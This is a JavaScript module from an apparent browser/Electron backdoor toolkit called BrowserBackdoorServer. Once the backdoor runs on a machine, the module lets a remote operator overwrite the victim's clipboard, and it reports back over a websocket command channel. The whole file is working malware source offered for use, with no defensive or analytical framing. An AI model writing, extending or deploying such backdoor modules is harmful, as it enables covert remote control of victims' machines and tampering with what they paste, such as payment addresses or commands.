// INTERACTIVE
/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Writes text to clipboard
 * Parameters: Text to write to clipboard 
 * Returns: undefined, error
 * Author: IMcPwn
 */

electron = require('electron')

writeClipboard = function (data) {
    electron.clipboard.writeText(data);
    ws.send("Wrote " + data + " to clipboard.");
}

ws.send("\nUsage: writeClipboard(data)\n- data is the text to write to the clipboard.");
